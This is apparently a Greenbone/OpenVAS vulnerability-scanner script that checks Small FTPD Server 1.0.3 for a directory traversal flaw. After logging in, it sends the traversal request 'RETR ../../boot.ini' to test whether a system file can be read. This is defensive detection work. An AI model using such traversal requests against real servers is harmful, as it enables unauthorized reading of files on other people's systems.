if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801534" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-11-04 14:21:53 +0100 (Thu, 04 Nov 2010)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "Small FTPD Server Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15358/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "Host/runs_windows", "ftp/smallftpd/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary
  files on the affected application." );
	script_tag( name: "affected", value: "Small FTPD Server version 1.0.3." );
	script_tag( name: "insight", value: "The flaw is due to an error handling certain requests which can
  be exploited to download arbitrary files from the host system via directory
  traversal sequences in the filenames." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Small FTPD Server and is prone to directory
  traversal vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "smallftpd" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if(login_details){
	result = ftp_send_cmd( socket: soc1, cmd: "RETR ../../boot.ini" );
	if(ContainsString( result, "150 Data connection ready." )){
		security_message( port: ftpPort );
	}
}
ftp_close( socket: soc1 );

